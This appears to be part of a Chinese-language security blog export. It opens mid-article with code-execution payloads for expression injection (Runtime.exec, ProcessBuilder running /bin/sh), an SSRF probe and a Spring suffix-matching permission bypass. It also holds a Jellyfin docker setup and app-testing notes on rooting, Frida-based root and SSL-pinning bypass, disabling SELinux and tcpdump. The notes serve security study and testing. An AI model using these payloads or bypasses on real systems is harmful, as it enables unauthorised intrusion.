<p>1.如果如上公式表达式中未禁用<code>Runtime.exec</code> 和 <code>ProcessBuilder</code>可以直接利用exec直接写代码执行，例如：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">new java.lang.ProcessBuilder([&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;whoami&quot;]).<span class="built_in">start</span>();</span><br></pre></td></tr></table></figure>

<p>2.如果禁用<code>Runtime.exec</code> 和 <code>ProcessBuilder</code>，且其他方法也零散的禁用了一些可以采用java网络的类进行内网探测或者SSRF攻击，测试代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u = new java.net.URL(&quot;xxxxx&quot;);u.openConnection()</span><br></pre></td></tr></table></figure>

<h1 id="有关事项：权限绕过"><a href="#有关事项：权限绕过" class="headerlink" title="有关事项：权限绕过"></a>有关事项：权限绕过</h1><p>参考<a href="https://forum.butian.net/share/2351">奇安信攻防社区-某OA 历史RCE分析</a></p>
<p>在springmvc版本<code>&lt;5.3</code>之前后缀匹配模式参数<code>useSuffixPatternMatch</code>默认值为<code>true</code></p>
<p>则访问<code>xx.js</code>、<code>xx.tmpl</code>等静态资源后缀可以进行权限绕过，访问漏洞路由</p>
<h1 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h1><p><a href="https://worktile.com/kb/ask/1291430.html">如何获取服务器的绝对路径 • Worktile社区</a></p>
<p>使用Java获取服务器的绝对路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">absolutePath</span> <span class="operator">=</span> getClass().getProtectionDomain().getCodeSource().getLocation().getPath();</span><br></pre></td></tr></table></figure>

<p>使用PHP获取服务器的绝对路径</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$absolutePath</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>使用Node.js获取服务器的绝对路径</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> absolutePath = path.<span class="title function_">resolve</span>(__dirname);</span><br></pre></td></tr></table></figure>

<p>使用ASP.NET获取服务器的绝对路径</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> absolutePath = Server.MapPath(<span class="string">&quot;~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>使用Python获取服务器的绝对路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">absolute_path = os.path.dirname(os.path.abspath(__file__))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>app测试</title>
    <url>/2025/12/29/app%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>了解一下app的权限划分和部分组件</p>
<span id="more"></span>

<p>学习于</p>
<p>“补天白帽黑客城市沙龙长沙站”的演讲ppt</p>
<h1 id="1-AndroidManifest参数"><a href="#1-AndroidManifest参数" class="headerlink" title="1-AndroidManifest参数"></a>1-AndroidManifest参数</h1><p>&#x3D;&#x3D;&#x3D;配置安全&#x3D;&#x3D;&#x3D;</p>
<p>1.debuggable(能否被调式)</p>
<p>2.allowBackup(是否允许备份和恢复应用数据)[true]</p>
<p>&#x3D;&#x3D;&#x3D;不安全的存储&#x3D;&#x3D;&#x3D;</p>
<p>3.SharedPreference(存储类)[&#x2F;data&#x2F;data&#x2F;Package&#x2F;shared_prefs&#x2F;]</p>
<p>&#x3D;&#x3D;&#x3D;不安全的日志打印&#x3D;&#x3D;&#x3D;</p>
<p>4.READ_LOGS(读取logcat所有日志)[Android&lt;4.1]</p>
<p>&#x3D;&#x3D;&#x3D;常规设定&#x3D;&#x3D;&#x3D;</p>
<p>5.Activity(交互界面)</p>
<p>6.android:exported(属性-用于声明)</p>
<p>7.Service(长期服务)</p>
<p>&#x3D;&#x3D;&#x3D;隐式广播漏洞&#x3D;&#x3D;&#x3D;</p>
<p>8.BroadcastReceiver(广播接收器)</p>
<p>9.sendOrderedBroadcast(发送系统全局广播)</p>
<p>10.Intent.setAction(给Intent添加标识)</p>
<p>&#x3D;&#x3D;&#x3D;webview调试风险&#x3D;&#x3D;&#x3D;</p>
<p>11.setWebContentsDebuggingEnabled(允许Debug调试)</p>
<p>&#x3D;&#x3D;&#x3D;file跨越风险&#x3D;&#x3D;&#x3D;</p>
<p>12.scheme(app跳转)</p>
<p>13.setAllowFileAccess(file:&#x2F;&#x2F;协议开关)</p>
<p>14.setAllowUniversalAccessFromFileURLs(访问远程资源)</p>
<p>&#x3D;&#x3D;&#x3D;JSBridge漏洞&#x3D;&#x3D;&#x3D;</p>
<p>15.JSBridge(通信桥梁)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见hook：</span><br><span class="line"></span><br><span class="line">===NO_PROXY绕过===</span><br><span class="line"></span><br><span class="line">===SSL Pinning绕过===</span><br></pre></td></tr></table></figure>

<h1 id="2-常见危害"><a href="#2-常见危害" class="headerlink" title="2-常见危害"></a>2-常见危害</h1><p>&#x3D;&#x3D;&#x3D;webview调试风险&#x3D;&#x3D;&#x3D;</p>
<p>1.大多数直接引用的网页的app功能八成可以打开webview</p>
]]></content>
      <categories>
        <category>Article</category>
      </categories>
      <tags>
        <tag>app-test</tag>
      </tags>
  </entry>
  <entry>
    <title>自动追番中jellyfin优化遇到的问题</title>
    <url>/2025/10/27/jellyfin%E4%BC%98%E5%8C%96%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	记录一下更改jellyfin服务端主题和插件的时候遇到的问题</p>
<span id="more"></span>

<h1 id="1-docker-compose-yml"><a href="#1-docker-compose-yml" class="headerlink" title="1-docker-compose.yml"></a>1-docker-compose.yml</h1><p>qbittorrent+auto_bangumi+jellyfin的docker部署；</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">qbittorrent:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">qbittorrent</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">superng6/qbittorrent</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TemPath=/downloads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SavePath=/downloads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PGID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PUID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WEBUI_PORT=8989</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/qbittorrent/config:/config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/qbittorrent/downloads:/downloads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/file:/file</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8989</span><span class="string">:8989</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">6881</span><span class="string">:6881</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">6881</span><span class="string">:6881/udp</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">auto_bangumi</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">auto_bangumi:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">auto_bangumi</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">estrellaxd/auto_bangumi:latest</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PGID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PUID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">AB_DOWNLOADER_HOST=http://qbittorrent:8989</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/auto_bangumi/config:/app/config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/auto_bangumi/data:/app/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">auto_bangumi</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">7892</span><span class="string">:7892</span></span><br><span class="line">    <span class="attr">dns:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">qbittorrent</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">jellyfin:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">jellyfin/jellyfin:10.9.11</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jellyfin</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">dns:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8096</span><span class="string">:8096</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/config:/config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/cache:/cache</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/media/Anime:/media/Anime</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/qbittorrent/downloads/Bangumi:/media/Bangumi</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/media/Movies:/media/Movies</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/js/index.html:/jellyfin/jellyfin-web/index.html</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/js/slideshowpure.js:/jellyfin/jellyfin-web/slideshowpure.js</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/js/slideshowpure.css:/jellyfin/jellyfin-web/slideshowpure.css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/js/avatars/:/jellyfin/jellyfin-web/avatars/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/local/jellyfin/js/ElegantFin.css:/jellyfin/jellyfin-web/ElegantFin.css</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">auto_bangumi:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">qb_config:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="2-简述问题"><a href="#2-简述问题" class="headerlink" title="2-简述问题"></a>2-简述问题</h1><p>1&gt;<strong>最好指定jellyfin版本</strong>，因为jellyfin刮削元数据的插件是比较必须的，因为国内的原因，所以只能用<a href="https://github.com/cxfksword/jellyfin-plugin-metashark">jellyfin-plugin-<em>metashark</em></a>中的豆瓣刮削元数据（国内建议只启用豆瓣刮削），但该刮削元数据的插件只支持10.9版本</p>
<p>2&gt;优化前端（可以用插件，但很多前端插件只支持10.10以上的，与刮削元数据的冲突了），想要任意设备访问前端都用的优化的前端页面，得在容器内部进行更改，即服务端更改相关代码<a href="https://github.com/MakD/Jellyfin-Media-Bar">Jellyfin-<em>Media</em>-<em>Bar</em></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- /var/local/jellyfin/js/index.html:/jellyfin/jellyfin-web/index.html</span><br><span class="line">- /var/local/jellyfin/js/slideshowpure.js:/jellyfin/jellyfin-web/slideshowpure.js</span><br><span class="line">- /var/local/jellyfin/js/slideshowpure.css:/jellyfin/jellyfin-web/slideshowpure.css</span><br><span class="line">- /var/local/jellyfin/js/avatars/list.txt:/jellyfin/jellyfin-web/avatars/list.txt</span><br></pre></td></tr></table></figure>

<p>index.html中<code>&lt;head&gt;</code>标签内要加入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;slideshowpure.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;slideshowpure.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>容器内的<code>/jellyfin/jellyfin-web/</code>目录需要下载两个文件（加速加载）</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/gh/MakD/Jellyfin-Media-Bar@latest/slideshowpure.js</span><br><span class="line"></span><br><span class="line">https://cdn.jsdelivr.net/gh/MakD/Jellyfin-Media-Bar@latest/slideshowpure.css</span><br></pre></td></tr></table></figure>

<p>list.txt是用于大屏的轮播的<strong>徽标</strong>图片</p>
<p>list.txt的内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Awesome Playlist Name（列表名字-无伤大雅）</span><br><span class="line">ItemID1（要轮播图片的id，就是视频详细上的url里面的id=xxxxx那个xxx）</span><br><span class="line">ItemID2</span><br><span class="line">ItemID3</span><br><span class="line">ItemID4</span><br><span class="line">ItemID5</span><br></pre></td></tr></table></figure>

<p>按照GitHub上面优化可能会遇到<strong>三个问题</strong>：</p>
<p>①国内最好下载js和css到jellyfin-web目录下进行本地化的部署，否则会访问慢或者干脆无响应</p>
<p>②js文件内500左右那行规定了list.txt在容器内的位置，注意放到对应内部位置（web指web服务下的目录，即jellyfin-web，我的版本-10.9.11）</p>
<p><code>/jellyfin/jellyfin-web/avatars/list.txt</code></p>
<p><img src="/../image/jellyfin-image/js-conten.png"></p>
<p>③该js用于轮播的图片是logo（即<strong>徽标</strong>），如果刮削元数据没有刮削下logo（<strong>徽标</strong>）的话需要自己导入进去，建议直接在前端导入<code>徽标</code>和<code>背景图</code>（更好看一点），不想改的话，可以直接把js代码中访问logo图片的<strong>接口</strong>改成刮削数据肯定会刮削的封面图<code>Primary</code></p>
<p><img src="/../image/jellyfin-image/logo.png"></p>
<h1 id="3-微调"><a href="#3-微调" class="headerlink" title="3-微调"></a>3-微调</h1><p>！最后因为版本的问题，可能需要微调一下间距然后加上主题，最好在控制台增加，应用所有客户端，也就是</p>
<p>主题推荐</p>
<p><a href="https://github.com/lscambo13/ElegantFin">https://github.com/lscambo13/ElegantFin</a></p>
<p>控制台—&gt;常规—&gt;自定义css</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">&quot;ElegantFin.css&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#homeTab</span> <span class="selector-class">.homeSectionsContainer</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">150px</span> <span class="meta">!important</span>;  <span class="comment">/* 调整这个值控制下移距离 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 登录页面的背景图 */</span></span><br><span class="line"><span class="selector-pseudo">:root</span>&#123;</span><br><span class="line">  <span class="attr">--loginPageBgUrl</span>: <span class="built_in">url</span>(<span class="string">&quot;/web/avatars/login.jpg?format=webp&amp;foregroundLayer=1&amp;quality=33&amp;width=3840&amp;height=2160&amp;blur=2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>①最后一行是图片的地址，我把图片放到本地了，作为首页登录的地址（注意，jellyfin的访问地址默认为web下所以需要加入&#x2F;web&#x2F;目录）</p>
<p><img src="/../image/jellyfin-image/mian-content.png"></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>app测试</title>
    <url>/2025/10/10/app%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>刚接触手机测试用传统抓包甚至都抓不到包，用wireshark抓包则数据乱码，搞了一台pixel手机用作app测试</p>
<p>app测试较为麻烦</p>
<p>主要麻烦存在：app虚拟机检测，app代理检测，app<code>root</code>环境检测，app证书固定，app请求体存在加密或签名，app加壳，app自定义算法，国密tls</p>
<p>记录学习笔记如下</p>
<span id="more"></span>

<p>目前我只会app的webview，然后用web的测试方法进行测试，好在测试环境都支持webview</p>
<p>注：鸿蒙5脱离了安卓系统</p>
<p>注：国密网址测试可以用yakit</p>
<h1 id="1-root-解锁BootLoader"><a href="#1-root-解锁BootLoader" class="headerlink" title="1-root+解锁BootLoader"></a>1-root+解锁BootLoader</h1><p>参考文章<a href="https://zhuanlan.zhihu.com/p/581342570">如何root一台Google Pixel 7 Pro</a></p>
<p>默认电脑装有<a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip"><code>adb</code></a>，手机开启<code>usb调试</code></p>
<p>注（需要获取对应版本号）：</p>
<p>设置 → 关于手机 → Android 版本 → Android 版本号 &#x2F; 版本号（Build number）</p>
<p><strong>所需网址</strong>：</p>
<p><a href="https://developers.google.com/android/images?hl=zh-cn">pixel出厂映像（注意版本号对应！）</a></p>
<p><a href="https://github.com/topjohnwu/Magisk/releases">Magisk 官方下载地址(用于root)</a></p>
<p><a href="https://github.com/anaelle-dev/P7P_Magisk_init_boot">获取 <code>init_boot.img</code> 的第二个方法（注意版本号对应！）</a></p>
<h2 id="操作流程："><a href="#操作流程：" class="headerlink" title="操作流程："></a><strong>操作流程</strong>：</h2><p><a href="https://post.smzdm.com/p/an9p9670/">24 年，Google Pixel 7 国内使用指南_手机_什么值得买</a></p>
<h2 id="简要："><a href="#简要：" class="headerlink" title="简要："></a>简要：</h2><h3 id="解锁-Bootloader"><a href="#解锁-Bootloader" class="headerlink" title="解锁 Bootloader"></a>解锁 Bootloader</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 重启手机 进入 bootloader 模式</span><br><span class="line">adb reboot bootloader</span><br><span class="line"></span><br><span class="line"># 进入 bootloader 模式之后</span><br><span class="line">fastboot flashing unlock</span><br><span class="line"></span><br><span class="line"># 没有重启就自己重启</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>

<h3 id="下载线刷出厂映像"><a href="#下载线刷出厂映像" class="headerlink" title="下载线刷出厂映像"></a>下载线刷出厂映像</h3><p><a href="https://developers.google.com/android/images?hl=zh-cn">pixel出厂映像（注意版本号对应！）</a></p>
<p><strong>#如果有代理可以选择flash进行线上刷机#</strong></p>
<p>下载后：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 进入到解压的文件夹中</span><br><span class="line"></span><br><span class="line"># 重启手机 进入 bootloader 模式</span><br><span class="line">adb reboot bootloader</span><br><span class="line"></span><br><span class="line"># mac 电脑 执行刷入</span><br><span class="line">./flash-all.sh </span><br><span class="line"></span><br><span class="line"># windows 电脑</span><br><span class="line">flash-all.bat</span><br></pre></td></tr></table></figure>

<h3 id="安装-Magisk-软件并打补丁"><a href="#安装-Magisk-软件并打补丁" class="headerlink" title="安装 Magisk 软件并打补丁"></a>安装 Magisk 软件并打补丁</h3><p><a href="https://github.com/topjohnwu/Magisk/releases"><code>Magisk</code> <code>GitHub</code>下载地址(用于root或者其他组件)</a></p>
<p>安装好后点击「安装 → 选择并修补一个文件」选择对应的<code>init_boot.img</code>安装（正常来说出厂映像就有对应的init_boot.img，也可以采用下面的第二个方法，这是别人用magisk编译好的，注意编译版本）</p>
<p><a href="https://github.com/anaelle-dev/P7P_Magisk_init_boot">获取 <code>init_boot.img</code> 的第二个方法（注意版本号对应！）</a></p>
<p>选择刚刚的 <code>init_boot.img</code></p>
<p>打完补丁后，会生成一个 <code>magisk_patched-xxx.img</code></p>
<p>adb pull拖出来然后用电脑执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flash init_boot magisk_patched-xxx.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>

<p>检查是否可以赋予root权限：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#电脑使用</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"></span><br><span class="line">#手机点击确定即可</span><br></pre></td></tr></table></figure>

<h1 id="2-绕过"><a href="#2-绕过" class="headerlink" title="2-绕过"></a>2-绕过</h1><p>参考文章</p>
<p><a href="https://zhuanlan.zhihu.com/p/470468650"><code>隐藏Root - Zygisk版面具过银行App等Root检测，妙用Shamiko模块 - 知乎</code></a></p>
<p><a href="https://zhuanlan.zhihu.com/p/564699416"><code>一例APP绕过root检测解密 - 知乎</code></a></p>
<p><strong>—–通用：frida -Uf com.xxx -l xxx.js—–</strong></p>
<p><strong>—–通用：更改源码中检测条件为永真—–</strong></p>
<p>绕过虚拟机–直接买真机</p>
<p>绕过认证和代理–hook+分析包</p>
<p>通用：<strong>采用frida-server的js注入绕过root或者ssl pinning等</strong></p>
<p>注：</p>
<p>安卓 10+ 可能出现 “permission denied”，需要：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su</span><br><span class="line">setenforce 0    <span class="comment"># 有些 ROM 必须关闭 SELinux</span></span><br><span class="line">getenforce</span><br></pre></td></tr></table></figure>

<h2 id="绕过root"><a href="#绕过root" class="headerlink" title="绕过root"></a>绕过root</h2><p><strong>基础方案（过于久远）</strong>：<br> <code>Zygisk（Magisk 设置开启） + Zygisk-Assistant（或 Shamiko） + safetynet-fix（过于久远） + MagiskHidePropsConf（过于久远）</code></p>
<p><strong>通用方案：</strong></p>
<p>文章介绍：<a href="https://www.cnblogs.com/ranbox/p/18461031">app逆向抓包技巧：ROOT检测绕过 - 七夜魔手 - 博客园</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">frida -U -f com.example.app -l hook.js</span><br></pre></td></tr></table></figure>

<h2 id="反编译-逆向："><a href="#反编译-逆向：" class="headerlink" title="反编译&#x2F;\逆向："></a><strong>反编译&#x2F;\逆向</strong>：</h2><p>安卓生态：classes.dex<code>或</code>classes*.dex）</p>
<p><a href="https://github.com/skylot/jadx">jadx</a></p>
<p>鸿蒙生态：看到 <code>.hap</code>、<code>.har</code>、<code>panda</code>、<code>.abc</code>、大量 <code>.so</code>、或 <code>resources</code> 结构</p>
<p>（使用 HAP 解包工具 &#x2F; ark 相关工具）</p>
<p>苹果生态：<code>.ipa</code></p>
<p> IDA&#x2F;Ghidra 反汇编</p>
<table>
<thead>
<tr>
<th>对比点</th>
<th>安卓 &#x2F; 鸿蒙兼容包</th>
<th>鸿蒙原生（Ark）</th>
<th>苹果生态（iOS&#x2F;macOS）</th>
</tr>
</thead>
<tbody><tr>
<td>代码语言</td>
<td>Java &#x2F; Kotlin &#x2F; ArkTS</td>
<td>ArkTS &#x2F; C++</td>
<td>Objective-C &#x2F; Swift</td>
</tr>
<tr>
<td>字节码</td>
<td>DEX &#x2F; Panda bytecode</td>
<td>Panda bytecode &#x2F; AOT</td>
<td><strong>LLVM Bitcode → ARM64 本地机器码</strong></td>
</tr>
<tr>
<td>运行时</td>
<td>ART &#x2F; ArkVM</td>
<td>ArkVM</td>
<td><strong>无虚拟机</strong>（直接在 Darwin 内核上执行）</td>
</tr>
<tr>
<td>包格式</td>
<td><code>.apk</code> &#x2F; <code>.hap</code></td>
<td><code>.hap</code> &#x2F; <code>.app</code></td>
<td><code>.ipa</code>（其实是 zip 格式）</td>
</tr>
<tr>
<td>可否被 JADX 反编译</td>
<td>✅ dex 可反编译</td>
<td>❌（需要专用 Ark 工具）</td>
<td>❌ 完全不同体系，不能用 jadx</td>
</tr>
<tr>
<td>典型反编译工具</td>
<td>JADX, apktool</td>
<td>arkdecompiler, DevEco unpacker</td>
<td>Hopper、IDA、Ghidra、class-dump、frida、Cycript</td>
</tr>
</tbody></table>
<h1 id="3-安装相关软件"><a href="#3-安装相关软件" class="headerlink" title="3-安装相关软件"></a>3-安装相关软件</h1><p>参考文章</p>
<p><a href="https://zhuanlan.zhihu.com/p/73008784">APP逆向神器之Frida【Android初级篇】 - 知乎</a></p>
<p>所需工具：</p>
<p><a href="https://www.androidtcpdump.com/android-tcpdump/downloads">Tcpdump</a></p>
<p><a href="https://www.gmproxy.cn/">国密测试工具</a></p>
<p><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip"><code>adb</code></a>+<strong><code>pip install frida-tools</code></strong>    (windows)</p>
<p><a href="https://github.com/frida/frida/releases">frida服务器（手机上）</a>或者使用<a href="https://github.com/ViRb3/magisk-frida">magisk-frida放到magisk里直接自启</a></p>
<h2 id="Frida使用方法（windows）"><a href="#Frida使用方法（windows）" class="headerlink" title="Frida使用方法（windows）"></a>Frida使用方法（windows）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida -U -l exploit.js -f xxx #启动app并注入脚本</span><br><span class="line">frida-ps -U</span><br><span class="line">frida-ps -Ua</span><br><span class="line">frida -U -l exploit.js &quot;XXXX&quot; #app已经启动 注入脚本</span><br></pre></td></tr></table></figure>

<p><strong>Android的Frida服务端运行(需root)</strong></p>
<p><a href="https://github.com/ViRb3/magisk-frida">magisk-frida放到magisk里自启</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#该符号代表后台运行&#x27;&amp;&#x27;</span><br><span class="line">frida-server &amp;</span><br><span class="line"></span><br><span class="line"># 或用 nohup</span><br><span class="line"></span><br><span class="line"># 可以写一个模块控制frida-server放到magisk里</span><br><span class="line">/data/adb/modules</span><br></pre></td></tr></table></figure>

<h2 id="Android-tcpdump的使用"><a href="#Android-tcpdump的使用" class="headerlink" title="Android-tcpdump的使用"></a>Android-tcpdump的使用</h2><p><strong>实时抓取所有包</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i any -nnvvXSs 0</span><br><span class="line"><span class="comment">#`-i any`：监听所有网卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#`-nn`：不解析域名/IP/端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#`-vv`：更详细</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#`-X`：显示包的十六进制和 ASCII</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#`-s 0`：抓取完整包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听lo输出ip和端口</span></span><br><span class="line">tcpdump -i lo -n -tttt -q tcp</span><br></pre></td></tr></table></figure>

<p><strong>实时抓取指定端口的包（以 58384 为例）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i any port 58384 -nnvvXSs 0</span><br><span class="line">抓取 TCP：</span><br><span class="line">tcpdump -i any tcp port 58384 -nnvvXSs 0</span><br><span class="line">抓取 UDP：</span><br><span class="line">tcpdump -i any udp port 58384 -nnvvXSs 0</span><br></pre></td></tr></table></figure>

<p><strong>抓取所有包并保存到 &#x2F;sdcard&#x2F;xxx</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i any -s 0 -w /sdcard/test.pcap</span><br><span class="line"><span class="comment">#建议加时间戳：</span></span><br><span class="line">tcpdump -i any -s 0 -w /sdcard/tcpdump_$(<span class="built_in">date</span> +%Y%m%d_%H%M%S).pcap</span><br><span class="line"><span class="comment">#抓取特定端口并保存：</span></span><br><span class="line">tcpdump -i any port 58384 -s 0 -w /sdcard/58384.pcap</span><br></pre></td></tr></table></figure>

